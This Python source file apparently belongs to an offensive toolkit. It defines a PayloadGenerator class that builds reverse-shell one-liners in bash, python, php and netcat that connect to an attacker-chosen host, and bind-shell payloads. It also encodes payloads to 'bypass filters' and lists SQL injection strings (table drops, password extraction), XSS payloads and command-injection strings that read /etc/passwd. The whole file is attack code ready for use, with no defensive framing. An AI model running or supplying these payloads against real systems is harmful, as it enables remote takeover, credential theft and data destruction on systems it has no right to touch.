
"""
Payload generation and delivery module
"""
import base64
import logging
from typing import Dict, List, Any

class PayloadGenerator:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
    def generate_reverse_shell(self, lhost: str, lport: int, shell_type: str = "bash") -> str:
        """Generate reverse shell payload"""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "nc": f"nc -e /bin/sh {lhost} {lport}"
        }
        
        return payloads.get(shell_type, payloads["bash"])
    
    def generate_bind_shell(self, port: int, shell_type: str = "bash") -> str:
        """Generate bind shell payload"""
        payloads = {
            "bash": f"nc -lvp {port} -e /bin/bash",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        }
        
        return payloads.get(shell_type, payloads["bash"])
    
    def encode_payload(self, payload: str, encoding: str = "base64") -> str:
        """Encode payload to bypass filters"""
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            import urllib.parse
            return urllib.parse.quote(payload)
        elif encoding == "hex":
            return payload.encode().hex()
        else:
            return payload
    
    def generate_sql_injection_payloads(self) -> List[str]:
        """Generate SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users; --",
            "' OR 1=1 LIMIT 1 OFFSET 0 --",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' UNION SELECT null,username,password FROM users--"
        ]
    
    def generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]
    
    def generate_command_injection_payloads(self) -> List[str]:
        """Generate command injection payloads"""
        return [
            "; cat /etc/passwd",
            "| whoami",
            "&& ls -la",
            "; id",
            "| cat /etc/hosts",
            "&& uname -a"
        ]
